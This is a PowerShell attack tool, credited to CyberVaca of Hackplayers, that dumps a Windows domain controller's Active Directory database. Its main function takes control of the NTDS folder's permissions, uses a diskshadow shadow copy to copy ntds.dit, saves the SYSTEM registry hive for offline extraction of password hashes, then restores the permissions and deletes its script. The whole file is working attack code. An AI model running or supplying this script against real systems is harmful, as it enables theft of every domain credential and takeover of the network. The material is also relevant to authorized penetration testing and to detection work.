function Backup-DumpNTDS {param($path)

$help = @"
.SYNOPSIS
    Backup Dump NTDS
    PowerShell Function: Backup-DumpNTDS
    Author: Luis Vacas (CyberVaca)
    Required dependencies: None
    Optional dependencies: None
.DESCRIPTION

.EXAMPLE
    Backup-DumpNTDIS -path "c:\exfil"

    Description
    -----------
    Dump the NTDS if you have the privilege of Backup or are within Backup Operators

"@
if ($path -eq $null) {$help} else {
if ($path.Substring($path.Length -1 ) -eq "\") {$path.Substring(0,($path.Length -1))}


$banner = @"
 ____    ____    __  __  _  __ __  ____         ____   ______  ___   _____
|    \  /    |  /  ]|  |/ ]|  |  ||    \       |    \ |      ||   \ / ___/
|  o  )|  o  | /  / |  ' / |  |  ||  o  )_____ |  _  ||      ||    (   \_ 
|     ||     |/  /  |    \ |  |  ||   _/|     ||  |  ||_|  |_||  D  \__  |
|  O  ||  _  /   \_ |     \|  :  ||  |  |_____||  |  |  |  |  |     /  \ |
|     ||  |  \     ||  .  ||     ||  |         |  |  |  |  |  |     \    |
|_____||__|__|\____||__|\_| \__,_||__|         |__|__|  |__|  |_____|\___|
                                                                                                                                                     
                                                           CyberVaca@Hackplayers
"@

function print-banner {param($banner)$Color = [char]27;$RED = "[31m";$GREEN = "92m";$END = "[0m";"$Color$RED" + $banner + "$Color$end"}
function Acl-FullControl {param ($user,$path)
$help = @"
.SYNOPSIS
    Acl-FullControl
    PowerShell Function: Acl-FullControl
    Author: Luis Vacas (CyberVaca)

    Required dependencies: None
    Optional dependencies: None
.DESCRIPTION

.EXAMPLE
    Acl-FullControl -user domain\usuario -path c:\users\administrador

    Description
    -----------
    If you have the SeBackupPrivilege privilege. You can change the permissions to the path you select.

"@
if ($user -eq $null -or $path -eq $null) {$help} else {
"[+] Current permissions:"
get-acl $path | fl
"[+] Changing permissions to $path"
$acl = get-acl $path
$aclpermisos = $user,'FullControl','ContainerInherit,ObjectInherit','None','Allow'
$permisoacl = new-object System.Security.AccessControl.FileSystemAccessRule $aclpermisos
$acl.AddAccessRule($permisoacl)
set-acl -Path $path -AclObject $acl
"[+] Acls changed successfully."
get-acl -path $path | fl

}
}
if ($menu -ne $null ) {function informa {param ($msg) ;$Color = [char]27 ; $RED = "[31m" ;$GREEN = "[92m" ; $END = "[0m"; "$Color$GREEN[$color$RED+$Color$GREEN] " + $msg + "$color$END"} } else {function informa {param($msg) "[+] $msg"}}

print-banner $banner
informa "Backup ACL"
$backup_acl = get-acl c:\windows\ntds
informa "Setting ACL"
Acl-FullControl -user $env:USERDOMAIN\$env:username -path c:\windows\ntds | Out-Null
get-acl C:\ProgramData | set-acl c:\windows\ntds
if ((Test-Path $path) -eq $false ) {mkdir $path -ErrorAction SilentlyContinue | Out-Null}
Set-Location $path
informa "Writing script Diskshadow"
$script = @"
set context persistent nowriters 
add volume c: alias someAlias2 
create 
expose %someAlias2% R: 
exec "c:\windows\system32\cmd.exe" /k copy r:\windows\ntds\ntds.dit CHANGEME\ntds.dit 
delete shadows volume %someAlias2% 
reset 
"@

$script = $script.replace("CHANGEME","$path")
$enc = [system.Text.Encoding]::UTF8
$script = $enc.GetBytes($script) 
Set-Content -Path $path\script.txt -Value $script -Encoding Byte
informa "Executing Diskshadow"
diskshadow.exe /s $path\script.txt | Out-Null
informa "Restore Backup ACL"
set-acl -path c:\windows\ntds $backup_acl
reg save HKLM\SYSTEM $path\system.dmp
rm $path\*.cab | Out-Null
rm $path\script.txt | out-null

}
}